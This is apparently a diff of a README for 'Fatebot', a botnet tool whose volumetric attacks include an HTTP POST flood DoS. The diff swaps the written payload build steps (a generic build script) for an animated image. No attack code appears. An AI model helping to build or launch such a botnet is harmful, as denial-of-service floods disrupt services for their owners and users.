@@ -22,10 +22,7 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
 <img src="img/posttraffic.png" alt="http post flood, dos example">
 
 # Build payload
----
-chmod +x build.sh
-./build.sh
----
+<img src="img/build.gif" alt="how to build">
 
 # Update Lists
 <p><strong>Fate v0.1</strong> = Fatebot open release.</p>
